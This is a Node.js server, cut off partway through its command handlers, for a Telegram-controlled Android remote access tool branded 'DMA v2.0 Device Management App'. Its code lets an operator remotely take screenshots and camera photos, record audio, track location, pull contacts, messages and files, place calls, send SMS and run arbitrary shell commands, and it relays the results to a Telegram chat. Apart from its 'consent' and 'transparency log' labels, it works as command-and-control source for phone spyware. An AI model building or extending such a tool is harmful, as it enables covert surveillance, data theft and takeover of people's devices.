require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const CryptoJS = require('crypto-js');
const helmet = require('helmet');

// Configuration
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const secretKey = process.env.SECRET_KEY;
const encryptionKey = process.env.ENCRYPTION_KEY;

// Security check
if (!token || token.includes('AAHGZy_dy804ZwHoq48SnIK_OadCN2wcQxA')) {
    console.error('❌ SECURITY ALERT: Using compromised token! Regenerate via @BotFather');
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });

// IMPORTANT FIX: Initialize bot with polling: false first, then start after checking
let bot = null;

// Data structures
const connectedDevices = new Map(); // deviceId -> {ws, deviceInfo, lastSeen, consents}
const pendingCommands = new Map(); // deviceId -> [commands]
const userSessions = new Map(); // userId -> {state, data, deviceId}

// Create necessary directories
['uploads', 'logs', 'screenshots', 'recordings', 'photos'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// File upload configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'unknown';
        let dir = `uploads/${type}`;
        
        // Organize by file type
        if (type.includes('screenshot')) dir = 'screenshots';
        else if (type.includes('audio') || type.includes('recording')) dir = 'recordings';
        else if (type.includes('photo') || type.includes('camera')) dir = 'photos';
        
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const timestamp = Date.now();
        const ext = path.extname(file.originalname);
        const safeName = `${deviceId}-${timestamp}${ext}`;
        cb(null, safeName);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 }, // 100MB limit
    fileFilter: (req, file, cb) => {
        const allowedTypes = [
            'image/jpeg', 'image/png', 'image/gif',
            'video/mp4', 'video/3gpp', 'video/avi',
            'audio/mpeg', 'audio/mp3', 'audio/wav',
            'application/pdf', 'text/plain',
            'application/vnd.android.package-archive'
        ];
        
        if (allowedTypes.includes(file.mimetype) || 
            /\.(jpg|jpeg|png|gif|mp4|3gp|avi|mov|mp3|wav|txt|pdf|apk)$/i.test(file.originalname)) {
            cb(null, true);
        } else {
            cb(new Error('File type not allowed'), false);
        }
    }
});

// Logging function
function logEvent(event, deviceId = 'system', details = '') {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${deviceId}] ${event}: ${details}\n`;
    
    // Console log with colors
    if (event.includes('ERROR')) {
        console.error('\x1b[31m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('CONNECTED')) {
        console.log('\x1b[32m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('COMMAND')) {
        console.log('\x1b[36m%s\x1b[0m', logEntry.trim());
    } else {
        console.log(logEntry.trim());
    }
    
    // File log
    try {
        fs.appendFileSync('logs/server.log', logEntry);
    } catch (e) {
        // Ignore
    }
}

// Setup Bot Commands with ALL original features + new consent commands
async function setupBotCommands() {
    if (!bot) return;
    
    const commands = [
        { command: 'start', description: '🚀 Start the DMA bot' },
        { command: 'list', description: '📱 List connected devices' },
        { command: 'info', description: 'ℹ️ Get device info (requires device ID)' },
        { command: 'cmd', description: '⚡ Execute command on device' },
        { command: 'file', description: '📁 Get file from device' },
        { command: 'screen', description: '📸 Take screenshot' },
        { command: 'call', description: '📞 Make a call' },
        { command: 'sms', description: '💬 Send SMS' },
        { command: 'apps', description: '📱 List installed apps' },
        { command: 'location', description: '📍 Get location' },
        { command: 'camera', description: '📷 Take photo' },
        { command: 'record', description: '🎤 Record audio' },
        { command: 'shell', description: '🖥️ Run shell command' },
        { command: 'files', description: '📂 Browse files' },
        { command: 'contacts', description: '📒 Get contacts' },
        { command: 'messages', description: '📨 Get messages' },
        { command: 'settings', description: '⚙️ Device settings' },
        { command: 'help', description: '❓ Show help message' },
        { command: 'keyboard', description: '⌨️ Show interactive keyboard' },
        // NEW CONSENT COMMANDS
        { command: 'consents', description: '🔐 Get consent status (requires device ID)' },
        { command: 'revoke', description: '🚫 Revoke specific consent (device ID + type)' },
        { command: 'revoke_all', description: '⚠️ Revoke all consents (requires device ID)' },
        { command: 'log', description: '📋 Get transparency log (requires device ID)' }
    ];

    try {
        await bot.setMyCommands(commands);
        console.log('✅ Bot commands set up successfully');
    } catch (error) {
        console.error('❌ Failed to setup bot commands:', error.message);
    }
}

// Initialize bot with error handling and retry logic
function initializeBot() {
    return new Promise((resolve, reject) => {
        try {
            console.log('🤖 Initializing Telegram bot...');
            
            // Create bot instance with polling options
            bot = new TelegramBot(token, {
                polling: true,
                filepath: false,
                onlyFirstMatch: true,
                request: {
                    agentOptions: {
                        keepAlive: true,
                        family: 4
                    },
                    url: 'https://api.telegram.org'
                }
            });

            // Test connection
            bot.getMe().then((me) => {
                console.log(`✅ Bot connected: @${me.username}`);
                resolve(bot);
            }).catch((error) => {
                console.error('❌ Bot connection failed:', error.message);
                reject(error);
            });

            // Handle polling errors
            bot.on('polling_error', (error) => {
                if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
                    console.error('\n\x1b[31m❌ CONFLICT ERROR: Another bot instance is running!\x1b[0m');
                    console.error('\x1b[33m📌 Solutions:\x1b[0m');
                    console.error('1. Stop any other servers running this bot');
                    console.error('2. If using Render/Heroku, restart the dyno');
                    console.error('3. If using localhost, kill all node processes: killall node');
                    console.error('4. Revoke old token and get new one from @BotFather\n');
                    
                    // Stop polling to prevent further errors
                    bot.stopPolling();
                } else {
                    console.error('⚠️ Polling error:', error.message);
                }
            });

            // Handle webhook errors
            bot.on('webhook_error', (error) => {
                console.error('⚠️ Webhook error:', error.message);
            });

        } catch (error) {
            console.error('❌ Failed to create bot:', error.message);
            reject(error);
        }
    });
}

// Enhanced interactive keyboards
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📱 List Devices' }, { text: 'ℹ️ Device Info' }],
            [{ text: '📸 Screenshot' }, { text: '📍 Location' }],
            [{ text: '📁 Files' }, { text: '📞 Call' }],
            [{ text: '💬 SMS' }, { text: '📷 Camera' }],
            [{ text: '🎤 Record' }, { text: '📱 Apps' }],
            [{ text: '🔐 Consents' }, { text: '📋 Transparency Log' }],
            [{ text: '⚙️ Settings' }, { text: '❓ Help' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

const deviceSelectionKeyboard = (devices) => {
    const buttons = [];
    devices.forEach((device, id) => {
        const model = device.deviceInfo?.model || 'Unknown';
        const shortId = id.substring(0, 6);
        buttons.push([{ 
            text: `📱 ${model} (${shortId}...)` 
        }]);
    });
    buttons.push([{ text: '🔙 Back to Main Menu' }]);
    
    return {
        reply_markup: {
            keyboard: buttons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };
};

const consentManagementKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '🔐 View All Consents' }, { text: '🚫 Revoke All' }],
            [{ text: '📍 Revoke Location' }, { text: '📷 Revoke Camera' }],
            [{ text: '🎤 Revoke Microphone' }, { text: '📒 Revoke Contacts' }],
            [{ text: '💬 Revoke SMS' }, { text: '📞 Revoke Calls' }],
            [{ text: '📁 Revoke Storage' }, { text: '📸 Revoke Screenshot' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const cameraTypeKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📷 Front Camera' }, { text: '📷 Rear Camera' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const fileActionsKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📥 Download' }, { text: '🗑️ Delete' }],
            [{ text: '📁 List Files' }, { text: '📊 Get Info' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const recordDurationKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '⏱️ 5 seconds' }, { text: '⏱️ 10 seconds' }],
            [{ text: '⏱️ 30 seconds' }, { text: '⏱️ 1 minute' }],
            [{ text: '⏱️ 5 minutes' }, { text: '⏱️ 10 minutes' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const settingsKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '🔔 Notification Settings' }, { text: '📊 Auto Report' }],
            [{ text: '🔐 Privacy Settings' }, { text: '⚡ Performance' }],
            [{ text: '🔄 Update Interval' }, { text: '🗑️ Clear Data' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const removeKeyboard = {
    reply_markup: {
        remove_keyboard: true
    }
};

// User session management
function setUserSession(userId, data) {
    userSessions.set(userId, { ...data, timestamp: Date.now() });
}

function getUserSession(userId) {
    return userSessions.get(userId);
}

function clearUserSession(userId) {
    userSessions.delete(userId);
}

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    try {
        const authToken = req.headers['authorization'];
        const deviceId = req.headers['device-id'];
        const deviceModel = req.headers['device-model'] || 'Unknown';
        const androidVersion = req.headers['android-version'] || 'Unknown';
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // Basic authentication
        if (!deviceId || !authToken) {
            ws.close(1008, 'Missing credentials');
            return;
        }

        const deviceInfo = {
            id: deviceId,
            model: deviceModel,
            androidVersion,
            ip,
            connectedAt: new Date().toISOString(),
            lastSeen: Date.now()
        };

        ws.deviceId = deviceId;
        
        // Initialize device with default consent tracking
        connectedDevices.set(deviceId, { 
            ws, 
            deviceInfo, 
            lastSeen: Date.now(),
            consents: new Map() // Will be updated from device
        });

        // Send welcome message to Telegram
        if (bot) {
            const message = `
📱 *🚀 NEW DEVICE CONNECTED - DMA v2.0*
━━━━━━━━━━━━━━━━━━━━━
• *Device:* \`${deviceModel}\`
• *Android:* ${androidVersion}
• *ID:* \`${deviceId}\`
• *IP:* ${ip}
• *Time:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
*Total Devices:* ${connectedDevices.size}
            `;

            bot.sendMessage(adminId, message, { parse_mode: 'Markdown' }).catch(e => {});
        }
        
        logEvent('DEVICE_CONNECTED', deviceId, `${deviceModel} (${androidVersion})`);

        // Handle incoming messages
        ws.on('message', (data) => {
            try {
                const message = JSON.parse(data.toString());
                handleDeviceMessage(deviceId, message);
            } catch (error) {
                console.error('Message parse error:', error);
            }
            const device = connectedDevices.get(deviceId);
            if (device) device.lastSeen = Date.now();
        });

        // Handle disconnection
        ws.on('close', () => {
            connectedDevices.delete(deviceId);
            if (bot) {
                bot.sendMessage(adminId, `📴 *Device Disconnected*\n\`${deviceId}\``, { parse_mode: 'Markdown' }).catch(e => {});
            }
            logEvent('DEVICE_DISCONNECTED', deviceId);
        });

        // Send pending commands
        if (pendingCommands.has(deviceId)) {
            const commands = pendingCommands.get(deviceId);
            commands.forEach(cmd => {
                ws.send(JSON.stringify(cmd));
            });
            pendingCommands.delete(deviceId);
        }

        // Send initial command to get device info and consents
        ws.send(JSON.stringify({
            type: 'command',
            id: uuidv4(),
            command: 'get_device_info',
            timestamp: Date.now()
        }));

    } catch (error) {
        console.error('Connection error:', error);
        ws.close(1011, 'Server error');
    }
});

// Handle device messages
function handleDeviceMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    switch (message.type) {
        case 'response':
            handleCommandResponse(deviceId, message);
            break;
        case 'file_upload':
            handleFileUpload(deviceId, message);
            break;
        case 'device_info':
            updateDeviceInfo(deviceId, message.data);
            break;
        case 'consent_status':
            updateConsentStatus(deviceId, message.data);
            break;
        case 'transparency_log':
            handleTransparencyLog(deviceId, message.data);
            break;
        case 'error':
            if (bot) {
                bot.sendMessage(adminId, `❌ *Error from ${deviceId}*\n\`\`\`${message.error}\`\`\``, { parse_mode: 'Markdown' }).catch(e => {});
            }
            break;
        default:
            console.log('Unknown message type:', message.type);
    }
}

// Update device information
function updateDeviceInfo(deviceId, info) {
    const device = connectedDevices.get(deviceId);
    if (device) {
        device.deviceInfo = { ...device.deviceInfo, ...info };
        
        // Send formatted device info to Telegram
        if (bot) {
            const infoMsg = `
📊 *DEVICE INFORMATION UPDATED*
━━━━━━━━━━━━━━━━━━━━━
📱 *Model:* ${info.model || 'Unknown'}
🤖 *Android:* ${info.android || 'Unknown'} (SDK ${info.sdk || 'Unknown'})
🔋 *Battery:* ${info.battery ? info.battery.toFixed(1) + '%' : 'Unknown'}
💾 *Storage:* ${formatBytes(info.internal_free)} free / ${formatBytes(info.internal_total)} total
📶 *Network:* ${info.network_type || 'Unknown'} (${info.connected ? 'Connected' : 'Disconnected'})
📦 *Apps:* ${info.apps_count || 0} installed
━━━━━━━━━━━━━━━━━━━━━
            `;
            
            bot.sendMessage(adminId, infoMsg, { parse_mode: 'Markdown' }).catch(e => {});
        }
    }
}

// Update consent status from device
function updateConsentStatus(deviceId, consentData) {
    const device = connectedDevices.get(deviceId);
    if (device && consentData.consents) {
        try {
            const consents = JSON.parse(consentData.consents);
            consents.forEach(consent => {
                device.consents.set(consent.type, consent);
            });
            
            // Send consent status to Telegram
            if (bot) {
                let msg = `🔐 *CONSENT STATUS - ${device.deviceInfo?.model || deviceId.substring(0, 8)}*\n━━━━━━━━━━━━━━━━━━━━━\n`;
                
                consents.forEach(consent => {
                    const status = consent.active ? '✅ ACTIVE' : '❌ REVOKED';
                    const timeStr = consent.revokedAt ? 
                        `\n  ⏰ Revoked: ${new Date(consent.revokedAt).toLocaleString()}` : '';
                    msg += `• *${consent.type}*: ${status}${timeStr}\n`;
                });
                
                bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
            }
        } catch (e) {
            console.error('Error parsing consents:', e);
        }
    }
}

// Handle transparency log from device
function handleTransparencyLog(deviceId, logData) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;
    
    try {
        const logs = JSON.parse(logData.log);
        let msg = `📋 *TRANSPARENCY LOG - ${device.deviceInfo?.model || deviceId.substring(0, 8)}*\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        logs.forEach((entry, index) => {
            if (index < 10) { // Limit to 10 entries
                msg += `*[${new Date(entry.timestamp).toLocaleString()}]*\n`;
                msg += `• Action: ${entry.action}\n`;
                if (entry.consentType) msg += `• Type: ${entry.consentType}\n`;
                msg += `• Details: ${entry.details}\n`;
                msg += `• Status: ${entry.status === 'success' ? '✅' : '❌'} ${entry.status}\n`;
                msg += `• By: ${entry.initiatedBy}\n\n`;
            }
        });
        
        if (bot) {
            bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
        }
    } catch (e) {
        console.error('Error parsing transparency log:', e);
    }
}

// Handle command responses
function handleCommandResponse(deviceId, response) {
    const device = connectedDevices.get(deviceId);
    const model = device?.deviceInfo?.model || deviceId.substring(0, 8);
    
    if (!bot) return;
    
    if (response.success) {
        if (response.data) {
            // Handle different response types
            if (response.data.lat && response.data.lng) {
                // Location response
                const mapsUrl = `https://www.google.com/maps?q=${response.data.lat},${response.data.lng}`;
                bot.sendLocation(adminId, response.data.lat, response.data.lng)
                    .then(() => {
                        bot.sendMessage(adminId, 
                            `📍 *LOCATION - ${model}*\n` +
                            `━━━━━━━━━━━━━━━━━━━━━\n` +
                            `• Latitude: \`${response.data.lat}\`\n` +
                            `• Longitude: \`${response.data.lng}\`\n` +
                            `• Accuracy: ±${response.data.accuracy || 'Unknown'}m\n` +
                            `━━━━━━━━━━━━━━━━━━━━━\n` +
                            `[View on Google Maps](${mapsUrl})`,
                            { parse_mode: 'Markdown' }
                        ).catch(e => {});
                    }).catch(e => {});
            } else if (response.data.contacts) {
                // Contacts response
                try {
                    const contacts = JSON.parse(response.data.contacts);
                    let msg = `📒 *CONTACTS - ${model}*\n━━━━━━━━━━━━━━━━━━━━━\n`;
                    contacts.slice(0, 20).forEach((contact, i) => {
                        msg += `${i+1}. *${contact.name || 'Unknown'}*: \`${contact.number}\`\n`;
                    });
                    if (contacts.length > 20) {
                        msg += `\n... and ${contacts.length - 20} more contacts\n`;
                    }
                    bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
                } catch (e) {}
            } else if (response.data.apps) {
                // Apps list response
                try {
                    const appsData = JSON.parse(response.data.list);
                    let msg = `📱 *INSTALLED APPS - ${model}*\n━━━━━━━━━━━━━━━━━━━━━\n`;
                    msg += `Total Apps: *${response.data.count}*\n\n`;
                    appsData.slice(0, 30).forEach((app, i) => {
                        msg += `${i+1}. \`${app}\`\n`;
                    });
                    if (appsData.length > 30) {
                        msg += `\n... and ${appsData.length - 30} more apps\n`;
                    }
                    bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
                } catch (e) {}
            } else if (response.data.consents) {
                // Consent status response
                updateConsentStatus(deviceId, response.data);
            } else if (response.data.log) {
                // Transparency log response
                handleTransparencyLog(deviceId, response.data);
            } else if (response.output) {
                // Shell command output
                const output = response.output.substring(0, 3000); // Limit length
                bot.sendMessage(adminId, 
                    `🖥️ *COMMAND OUTPUT - ${model}*\n━━━━━━━━━━━━━━━━━━━━━\n\`\`\`\n${output}\n\`\`\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
            } else {
                // Generic success response
                bot.sendMessage(adminId, 
                    `✅ *Command Executed Successfully*\n━━━━━━━━━━━━━━━━━━━━━\n` +
                    `• Device: \`${model}\`\n` +
                    `• Result: \`\`\`${JSON.stringify(response.data, null, 2).substring(0, 500)}\`\`\``,
                    { parse_mode: 'Markdown' }
                ).catch(e => {});
            }
        }
    } else {
        // Error response
        bot.sendMessage(adminId, 
            `❌ *Command Failed - ${model}*\n━━━━━━━━━━━━━━━━━━━━━\n` +
            `• Error: \`${response.error || 'Unknown error'}\`\n` +
            `• Device: \`${deviceId}\``,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    }
}

// Handle file upload notifications
function handleFileUpload(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    const model = device?.deviceInfo?.model || deviceId.substring(0, 8);
    
    if (bot) {
        bot.sendMessage(adminId, 
            `📁 *FILE RECEIVED - ${model}*\n━━━━━━━━━━━━━━━━━━━━━\n` +
            `• Type: \`${message.fileType || 'Unknown'}\`\n` +
            `• Path: \`${message.filePath || 'Unknown'}\`\n` +
            `━━━━━━━━━━━━━━━━━━━━━\n` +
            `_Processing and forwarding to Telegram..._`,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    }
}

// Helper function to format bytes
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Send command to device
function sendCommandToDevice(deviceId, command, data = {}) {
    const device = connectedDevices.get(deviceId);
    if (!device) {
        return false;
    }
    
    const cmdObj = {
        type: 'command',
        id: uuidv4(),
        command: command,
        data: data,
        timestamp: Date.now()
    };
    
    try {
        device.ws.send(JSON.stringify(cmdObj));
        logEvent('COMMAND_SENT', deviceId, `${command} ${JSON.stringify(data)}`);
        return true;
    } catch (error) {
        console.error('Send command error:', error);
        return false;
    }
}

// Initialize bot and setup handlers AFTER bot is ready
async function startBot() {
    try {
        // Check if another instance is running by testing webhook
        const webhookInfo = await fetch(`https://api.telegram.org/bot${token}/getWebhookInfo`).then(res => res.json());
        
        if (webhookInfo.ok && webhookInfo.result.url) {
            console.log('⚠️ Bot has active webhook. Deleting...');
            await fetch(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`);
            console.log('✅ Webhook deleted');
        }
        
        // Initialize bot
        await initializeBot();
        
        // Setup command handlers
        setupBotCommandHandlers();
        
        // Setup bot commands
        await setupBotCommands();
        
        return bot;
    } catch (error) {
        console.error('❌ Failed to start bot:', error.message);
        return null;
    }
}

// Setup all bot command handlers
function setupBotCommandHandlers() {
    if (!bot) return;
    
    // /start command
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        
        if (chatId.toString() !== adminId) {
            bot.sendMessage(chatId, '⛔ *UNAUTHORIZED ACCESS*\nYou are not authorized to use this bot.', { parse_mode: 'Markdown' }).catch(e => {});
            return;
        }
        
        const welcome = `
🤖 *🚀 DMA v2.0 - DEVICE MANAGEMENT APP*
━━━━━━━━━━━━━━━━━━━━━

Welcome to the enhanced Device Management System! 
Control all connected devices with full privacy controls.

*✨ NEW FEATURES:*
• 🔐 Consent Management - Revoke ANY permission ANY time
• 📋 Transparency Log - Complete audit trail
• ⚡ Faster command execution
• 📊 Real-time device monitoring

*📱 AVAILABLE COMMANDS:*
━━━━━━━━━━━━━━━━━━━━━
• Use buttons below for quick actions
• Type /list to see connected devices
• Type /help for all commands

*🔐 PRIVACY FIRST:*
All consents can be revoked at any time.
Every action is logged for complete transparency.

━━━━━━━━━━━━━━━━━━━━━
*Connected Devices:* ${connectedDevices.size}
        `;
        
        bot.sendMessage(chatId, welcome, { 
            parse_mode: 'Markdown',
            reply_markup: mainKeyboard.reply_markup 
        }).catch(e => {});
    });

    // /keyboard command
    bot.onText(/\/keyboard/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        bot.sendMessage(chatId, '🔄 *Interactive Keyboard Activated*', { 
            parse_mode: 'Markdown',
            reply_markup: mainKeyboard.reply_markup 
        }).catch(e => {});
    });

    // /list command
    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        if (connectedDevices.size === 0) {
            bot.sendMessage(chatId, '📭 *No Devices Connected*\n\nWaiting for devices to connect...', { 
                parse_mode: 'Markdown',
                reply_markup: removeKeyboard.reply_markup 
            }).catch(e => {});
            return;
        }
        
        let response = `📱 *CONNECTED DEVICES (${connectedDevices.size})*\n`;
        response += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        connectedDevices.forEach((device, id) => {
            const uptime = Math.floor((Date.now() - device.lastSeen) / 60000);
            const battery = device.deviceInfo?.battery ? `${device.deviceInfo.battery.toFixed(1)}%` : 'Unknown';
            const model = device.deviceInfo?.model || 'Unknown';
            const android = device.deviceInfo?.androidVersion || device.deviceInfo?.android || 'Unknown';
            
            response += `📱 *${model}*\n`;
            response += `  • ID: \`${id}\`\n`;
            response += `  • Android: ${android}\n`;
            response += `  • Battery: ${battery}\n`;
            response += `  • Last Seen: ${uptime} min ago\n`;
            response += `  • IP: ${device.deviceInfo?.ip || 'Unknown'}\n`;
            
            const activeConsents = Array.from(device.consents.values())
                .filter(c => c.active).length;
            response += `  • Active Consents: ${activeConsents}\n\n`;
        });
        
        bot.sendMessage(chatId, response, { 
            parse_mode: 'Markdown',
            reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
        }).catch(e => {});
    });

    // /info command
    bot.onText(/\/info (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'get_device_info');
            bot.sendMessage(chatId, 
                `ℹ️ *Getting device info...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /cmd command
    bot.onText(/\/cmd/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        if (connectedDevices.size === 0) {
            bot.sendMessage(chatId, '❌ *No devices connected*', { parse_mode: 'Markdown' }).catch(e => {});
            return;
        }
        
        setUserSession(chatId, { state: 'awaiting_device_for_command' });
        bot.sendMessage(chatId, '⚡ *Select device to execute command:*', { 
            parse_mode: 'Markdown',
            reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
        }).catch(e => {});
    });

    // /screen command
    bot.onText(/\/screen (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'take_screenshot');
            bot.sendMessage(chatId, 
                `📸 *Screenshot command sent*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /call command
    bot.onText(/\/call (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const phoneNumber = match[2];
        
        const device = connectedDevices.get(deviceId);
        if (device) {
            sendCommandToDevice(deviceId, 'make_call', { number: phoneNumber });
            bot.sendMessage(chatId, 
                `📞 *Calling ${phoneNumber}...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /sms command
    bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const phoneNumber = match[2];
        const message = match[3];
        
        const device = connectedDevices.get(deviceId);
        if (device) {
            sendCommandToDevice(deviceId, 'send_sms', { number: phoneNumber, message: message });
            bot.sendMessage(chatId, 
                `💬 *Sending SMS to ${phoneNumber}...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /apps command
    bot.onText(/\/apps (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'list_apps');
            bot.sendMessage(chatId, 
                `📱 *Getting apps list...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /location command
    bot.onText(/\/location (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const device = connectedDevices.get(deviceId);
        
        if (device) {
            sendCommandToDevice(deviceId, 'get_location');
            bot.sendMessage(chatId, 
                `📍 *Getting location...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /camera command
    bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const cameraType = match[2];
        
        const device = connectedDevices.get(deviceId);
        if (device) {
            sendCommandToDevice(deviceId, 'take_photo', { camera: cameraType });
            bot.sendMessage(chatId, 
                `📷 *Taking ${cameraType} camera photo...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /record command
    bot.onText(/\/record (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const seconds = parseInt(match[2]);
        
        const device = connectedDevices.get(deviceId);
        if (device) {
            sendCommandToDevice(deviceId, 'record_audio', { seconds: seconds });
            bot.sendMessage(chatId, 
                `🎤 *Recording ${seconds} seconds...*\nDevice: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /shell command
    bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const command = match[2];
        
        const device = connectedDevices.get(deviceId);
        if (device) {
            sendCommandToDevice(deviceId, 'execute', { cmd: command });
            bot.sendMessage(chatId, 
                `🖥️ *Executing command...*\nDevice: \`${deviceId.substring(0, 8)}...\`\nCommand: \`${command}\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        } else {
            bot.sendMessage(chatId, 
                `❌ *Device not connected*\nID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
    });

    // /files command
    bot.onText(/\/files (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
